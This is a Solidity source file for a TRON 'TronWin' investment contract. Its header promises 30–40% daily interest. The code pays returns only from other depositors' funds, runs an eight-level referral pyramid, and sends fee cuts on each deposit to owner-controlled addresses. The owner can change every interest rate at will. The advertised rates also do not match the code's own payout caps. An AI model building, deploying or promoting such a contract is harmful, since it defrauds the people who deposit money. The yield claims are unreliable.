//SourceUnit: PassiveTron1.sol

/*
 * TRON WIN - Testing Contract
 * Up to 40% Dividend depending upon the investment size
 * 50 TRX to 10000 TRX - 30% Daily Interest
 * 10000 TRX to 50000 TRX - 33% Daily Interest
 * 50000 TRX to 100000 TRX - 35% Daily Interest
 * 100000 TRX to 200000 TRX - 37% Daily Interest
 * 200000 TRX and above - 40% Daily Interest
 * URL: https://www.tronwin.club
 */

pragma solidity ^0.4.25;

contract TronWin {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize1 = 50000000;
    uint private minDepositSize2 = 5000000000;
    uint private minDepositSize3 = 10000000000;
    uint private minDepositSize4 = 25000000000;
    uint private minDepositSize5 = 50000000000;
    uint private minDepositSize6 = 250000000000;
    uint private minDepositSize7 = 500000000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public Interest;
    uint public Interest1 = 200;
    uint public Interest2 = 250;
    uint public Interest3 = 300;
    uint public Interest4 = 350;
    uint public Interest5 = 400;
    uint public Interest6 = 450;
    uint public Interest7 = 500;
    uint public commissionDivisor = 100;
    uint public collectProfit;
    uint private minuteRate;
    uint private minuteRate1 = 115744;
    uint private minuteRate2 = 115744;
    uint private minuteRate3 = 231487;
    uint private minuteRate4 = 231487;
    uint private minuteRate5 = 347230;
    uint private minuteRate6 = 347230;
    uint private minuteRate7 = 347230;
    uint private releaseTime = 1594656000;
    address private feed1 = msg.sender;
    address private feed2 = msg.sender;
    address private feed3 = msg.sender;
    address private feed4 = msg.sender;
      
     
    address owner;
    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
    }

    mapping(address => Player) public players;

    constructor() public {
      owner = msg.sender;
    }


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
      players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
      players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);
      players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);
      players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize1);


        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint feedEarn1 = depositAmount.mul(devCommission).mul(5).div(commissionDivisor);
        uint feedEarn2 = depositAmount.mul(devCommission).mul(2).div(commissionDivisor);
        feed1.transfer(feedEarn1);
        feed2.transfer(feedEarn1);
        feed3.transfer(feedEarn2);
        feed4.transfer(feedEarn2);
    
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      distributeRef(depositAmount, player.affFrom);


        uint feedEarn1 = depositAmount.mul(devCommission).mul(5).div(commissionDivisor);
        uint feedEarn2 = depositAmount.mul(devCommission).mul(2).div(commissionDivisor);
        feed1.transfer(feedEarn1);
        feed2.transfer(feedEarn1);
        feed3.transfer(feedEarn2);
        feed4.transfer(feedEarn2);
        
        
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
        
         if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
            minuteRate = minuteRate1;
            Interest = Interest1;
        }
        
                        if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
             minuteRate = minuteRate2;
             Interest = Interest2;
        }
        
                               if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
             minuteRate = minuteRate3;
             Interest = Interest3;
        }
        
                                       if (player.trxDeposit > minDepositSize4 && player.trxDeposit <= minDepositSize5) {
             minuteRate = minuteRate4;
             Interest = Interest4;
        }
                            if (player.trxDeposit > minDepositSize5 && player.trxDeposit <= minDepositSize6) {
             minuteRate = minuteRate5;
             Interest = Interest5;
        }
        
                                  if (player.trxDeposit > minDepositSize6 && player.trxDeposit <= minDepositSize7) {
             minuteRate = minuteRate6;
             Interest = Interest6;
        }
                                       if (player.trxDeposit > minDepositSize7) {
             minuteRate = minuteRate7;
             Interest = Interest7;
        }
        
         uint collectProfitGross = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
         
         uint256 maxprofit = (player.trxDeposit.mul(Interest).div(commissionDivisor));
         uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
         uint256 amountpaid = (player.payoutSum.add(player.affRewards));
         uint256 sum = amountpaid.add(collectProfitNet);
         
         
                if (sum <= maxprofit) {
             collectProfit = collectProfitGross; 
        } 
        else{
            uint256 collectProfit_net = maxprofit.sub(amountpaid); 
             
             if (collectProfit_net > 0) {
             collectProfit = collectProfit_net; 
             }
              else{
              collectProfit = 0; 
              }
  }
         
         
         
         player.interestProfit = player.interestProfit.add(collectProfit);
         player.time = player.time.add(secPassed);
         
                  
 }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(33)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        uint256 _affRewards = 0;
        
             if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(15)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            _affAddr4.transfer(_affRewards);
        }

        if (_affAddr5 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            _affAddr5.transfer(_affRewards);
        }

        if (_affAddr6 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
            _affAddr6.transfer(_affRewards);
        }

        if (_affAddr7 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
            _affAddr7.transfer(_affRewards);
        }

        if (_affAddr8 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
            _affAddr8.transfer(_affRewards);
        }

        if(_allaff > 0 ){
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);
      uint secPassed = now.sub(player.time);
     
       if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
            minuteRate = minuteRate1;
            Interest = Interest1;
        }
        
                        if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
             minuteRate = minuteRate2;
             Interest = Interest2;
        }
        
                               if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
             minuteRate = minuteRate3;
             Interest = Interest3;
        }
        
                                       if (player.trxDeposit > minDepositSize4 && player.trxDeposit <= minDepositSize5) {
             minuteRate = minuteRate4;
             Interest = Interest4;
        }
                            if (player.trxDeposit > minDepositSize5 && player.trxDeposit <= minDepositSize6) {
             minuteRate = minuteRate5;
             Interest = Interest5;
        }
        
                                  if (player.trxDeposit > minDepositSize6 && player.trxDeposit <= minDepositSize7) {
             minuteRate = minuteRate6;
             Interest = Interest6;
        }
                                       if (player.trxDeposit > minDepositSize7) {
             minuteRate = minuteRate7;
             Interest = Interest7;
        }

      if (secPassed > 0) {
      uint256 collectProfitGross = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      uint256 maxprofit = (player.trxDeposit.mul(Interest).div(commissionDivisor));
      uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
      uint256 amountpaid = (player.payoutSum.add(player.affRewards));
      uint256 sum = amountpaid.add(collectProfitNet);
      
       if (sum <= maxprofit) {
             collectProfit = collectProfitGross; 
        } 
        else{
            uint256 collectProfit_net = maxprofit.sub(amountpaid); 
             
             if (collectProfit_net > 0) {
             collectProfit = collectProfit_net; 
             }
              else{
              collectProfit = 0; 
              }
  }
        
        
  }
      return collectProfit.add(player.interestProfit);
      

    }
    
    
     function updateFeed1(address _address)  {
       require(msg.sender==owner);
       feed1 = _address;
    }
    
     function updateFeed2(address _address)  {
       require(msg.sender==owner);
       feed2 = _address;
    }
    
       function updateFeed3(address _address)  {
       require(msg.sender==owner);
       feed3 = _address;
    }
    
       function updateFeed4(address _address)  {
       require(msg.sender==owner);
       feed4 = _address;
    }
    

     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    
     function setMinuteRate1(uint256 _MinuteRate1) public {
      require(msg.sender==owner);
      minuteRate1 = _MinuteRate1;
    }
    
     function setMinuteRate2(uint256 _MinuteRate2) public {
      require(msg.sender==owner);
      minuteRate2 = _MinuteRate2;
    }
    
     function setMinuteRate3(uint256 _MinuteRate3) public {
      require(msg.sender==owner);
      minuteRate3 = _MinuteRate3;
    }
    
     function setMinuteRate4(uint256 _MinuteRate4) public {
      require(msg.sender==owner);
      minuteRate4 = _MinuteRate4;
    }
    
     function setMinuteRate5(uint256 _MinuteRate5) public {
      require(msg.sender==owner);
      minuteRate5 = _MinuteRate5;
    }
    
     function setMinuteRate6(uint256 _MinuteRate6) public {
      require(msg.sender==owner);
      minuteRate6 = _MinuteRate6;
    }
    
     function setMinuteRate7(uint256 _MinuteRate7) public {
      require(msg.sender==owner);
      minuteRate7 = _MinuteRate7;
    }
    
     function setInterest1(uint256 _Interest1) public {
      require(msg.sender==owner);
      Interest1 = _Interest1;
    } 
    
         function setInterest2(uint256 _Interest2) public {
      require(msg.sender==owner);
      Interest2 = _Interest2;
    }
    
         function setInterest3(uint256 _Interest3) public {
      require(msg.sender==owner);
      Interest3 = _Interest3;
    }
    
         function setInterest4(uint256 _Interest4) public {
      require(msg.sender==owner);
      Interest4 = _Interest4;
    }
    
         function setInterest5(uint256 _Interest5) public {
      require(msg.sender==owner);
      Interest5 = _Interest5;
    }
    
         function setInterest6(uint256 _Interest6) public {
      require(msg.sender==owner);
      Interest6 = _Interest6;
    }
    
         function setInterest7(uint256 _Interest7) public {
      require(msg.sender==owner);
      Interest7 = _Interest7;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}